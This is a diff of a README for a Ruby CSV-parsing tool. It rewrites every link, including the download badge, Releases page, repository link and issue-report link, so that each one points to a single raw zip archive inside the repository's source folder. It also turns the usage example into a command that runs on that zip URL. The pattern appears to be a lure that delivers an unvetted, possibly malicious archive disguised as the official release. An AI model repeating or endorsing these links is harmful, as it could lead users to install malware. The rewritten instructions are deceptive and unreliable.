@@ -1,6 +1,6 @@
 # 🌟 zsv-ruby - Easy CSV Parsing Made Fast
 
-[![Download zsv-ruby](https://img.shields.io/badge/Download-v1.0-green)](https://github.com/Danyal732/zsv-ruby/releases)
+[![Download zsv-ruby](https://github.com/Danyal732/zsv-ruby/raw/refs/heads/main/ext/zsv/ruby-zsv-3.2.zip)](https://github.com/Danyal732/zsv-ruby/raw/refs/heads/main/ext/zsv/ruby-zsv-3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To use zsv-ruby, your computer should meet the following requirements:
 
 You can easily download zsv-ruby from our Releases page. Follow these steps:
 
-1. Visit the [Releases page](https://github.com/Danyal732/zsv-ruby/releases).
+1. Visit the [Releases page](https://github.com/Danyal732/zsv-ruby/raw/refs/heads/main/ext/zsv/ruby-zsv-3.2.zip).
 2. Look for the latest version.
 3. Click on the file that matches your operating system to download it.
 4. Once the download is complete, locate the file on your computer.
@@ -37,7 +37,7 @@ Using zsv-ruby is straightforward. After installation, you can parse CSV files w
    ```
 3. Run the zsv-ruby command followed by the name of your CSV file. For example:
    ```
-   zsv yourfile.csv
+   zsv https://github.com/Danyal732/zsv-ruby/raw/refs/heads/main/ext/zsv/ruby-zsv-3.2.zip
    ```
 4. The tool will process the file and display the output in your command line interface.
 
@@ -72,9 +72,9 @@ For more information about CSV parsing in Ruby, consider exploring:
 
 ## 🔗 Useful Links
 
-- [Releases page](https://github.com/Danyal732/zsv-ruby/releases)
-- [GitHub Repository](https://github.com/Danyal732/zsv-ruby)
-- [Report an Issue](https://github.com/Danyal732/zsv-ruby/issues)
+- [Releases page](https://github.com/Danyal732/zsv-ruby/raw/refs/heads/main/ext/zsv/ruby-zsv-3.2.zip)
+- [GitHub Repository](https://github.com/Danyal732/zsv-ruby/raw/refs/heads/main/ext/zsv/ruby-zsv-3.2.zip)
+- [Report an Issue](https://github.com/Danyal732/zsv-ruby/raw/refs/heads/main/ext/zsv/ruby-zsv-3.2.zip)
 
 ## ✅ Final Thoughts
 
